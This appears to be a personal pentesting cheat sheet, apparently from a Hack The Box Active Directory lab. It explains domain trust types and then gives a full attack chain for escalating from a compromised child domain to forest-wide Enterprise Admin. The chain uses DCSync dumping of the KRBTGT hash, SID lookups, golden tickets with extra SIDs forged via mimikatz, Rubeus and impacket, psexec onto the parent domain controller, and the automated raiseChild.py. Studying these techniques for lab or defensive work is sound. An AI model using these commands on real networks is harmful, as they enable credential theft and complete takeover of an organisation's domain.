# Types:
- `Parent-Child`: This trust relationship forms between a parent domain and a child domain within the same forest. The parent domain inherently trusts the child domain, and vice versa. It's established automatically whenever a new child domain is created within a forest.
- `Tree-Root`: This trust relationship links the root domain of one tree to the root domain of another tree within the same forest. Whenever a new tree is created in a forest, this trust is automatically established.
- `External Trust`: This trust link forms between a domain in one forest and a domain in a separate forest. It facilitates users from one domain to access resources located in the other domain. Typically, it's implemented when accessing resources in a forest lacking established trust relationships.
- `Forest Trust`: This trust relationship is established between two forests, specifically between the root domains of each forest. It enables users from one forest to access resources hosted in the other forest.
- `Shortcut (or Cross-Link) Trust`: This trust connection emerges between two child domains belonging to different trees (or parent domains) within the same forest. It aims to minimize authentication hops between distant domains and can be either one-way or two-way transitive.
- `Realm Trust`: This trust relationship connects a Windows domain with a non-Windows domain, such as a Kerberos realm. It enables users within the Windows domain to access resources situated in the non-Windows domain.
# Transitive or not?
```
    A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
    In a non-transitive trust, the child domain itself is the only one trusted.
```
# Directionality:
```
    One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
    Bidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.

```


## List Trusts
```
Import-Module activedirectory
Get-ADTrust -Filter *
or
Import ./Powerview.ps1
Get-DomainTrust 
or
Import ./Powerview.ps1
Get-DomainTrustMapping
```
## Query something in another forest
```
Import ./Powerview.ps1
Get-DomainUser -Domain FQDN | select SamAccountName
```



# Attacks
This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. 
SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. 
<font color="#c00000">Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. </font>In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.
### Requisites:
To perform this attack after compromising a child domain, we need the following:
```
    The KRBTGT hash for the child domain
    The SID for the child domain
    The name of a target user in the child domain (does not need to exist!)
    The FQDN of the child domain.
    The SID of the Enterprise Admins group of the root domain.
    With this data collected, the attack can be performed with Mimikatz.
```
### Option1 with Mimikatz(Windows ONLY):
```
./mimikatz.exe
lsadump::dcsync /user:LOGISTICS\krbtgt
```
(KRBTGT hash for the child domain)
```
Get-DomainSID
```
(SID for the child domain)
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
(SID of the Enterprise Admins group of the root domain)
```
mimikatz.exe
kerberos::golden /user:hacker /domain:CHILDDOMAIN /sid:SID_CHILD_DOMAIN /krbtgt:KRBTGT_NT_HASH /sids:SID_ENTADMIN_ROOT_DOMAIN /ptt
```
(This creates a Golden ticket of a fake user)
```
klist
(Check it in memory)
-----------
Option2 with Rubeus.exe(Windows ONLY):
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:CHILDDOMAIN /sid:SID_CHILD_DOMAIN  /sids:SID_ENTADMIN_ROOT_DOMAIN /user:hacker /ptt
```
(This creates a Golden ticket of a fake user)
### ExtraSids Attack (Linux ONLY):
To perform this attack after compromising a child domain, we need the following:
```
    The KRBTGT hash for the child domain
    The SID for the child domain
    The name of a target user in the child domain (does not need to exist!)
    The FQDN of the child domain.
    The SID of the Enterprise Admins group of the root domain.
    With this data collected, the attack can be performed with Mimikatz.
```

```
secretsdump.py CHILD_DOMAIN/USER@IP -just-dc-user DOMAIN/krbtgt
```
(The KRBTGT hash for the child domain)
```
impacket-lookupsid CHILD_DOMAIN/USER@CHILD_DC | grep "Domain SID"
```
(The SID for the child domain)
```
impacket-lookupsid CHILD_DOMAIN/USER@PARENT_DC | | grep -B12 "Enterprise Admins"
```
(The SID of the Enterprise Admins group of the root domain.)
```
Example: impacket-lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
The sid is S-1-5-21-3842939050-3880317879-2865463114 + 519 = S-1-5-21-3842939050-3880317879-2865463114-519
```

```
impacket-ticketer -nthash KRBTGT_HASH -domain CHILDDOMAIN -domain-sid SID_CHILD_DOMAIN -extra-sid SID_ENTADMIN_ROOT_DOMAIN Administrator
```
(This creates a Golden ticket of a fake user)
```
export KRB5CCNAME=Administrator.ccache 
```
(Point to the golden ticket)
```
psexec.py CHILDDOMAIN/Administrator@FQDN_PARENT_DC -k -no-pass -target-ip PARENT_DC_IP
```
(-k tells to use the ticket from env)
### Easier and faster:
https://github.com/fortra/impacket/blob/master/examples/raiseChild.py
```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
(This will help you takeover as will perform automatically the previous steps in one go!)
or dump the hashes with Pass the hash
```
secretsdump.py PARENT_DOMAIN/USER@IP -just-dc-user DOMAIN/krbtgt -hashes ':NThash'
```
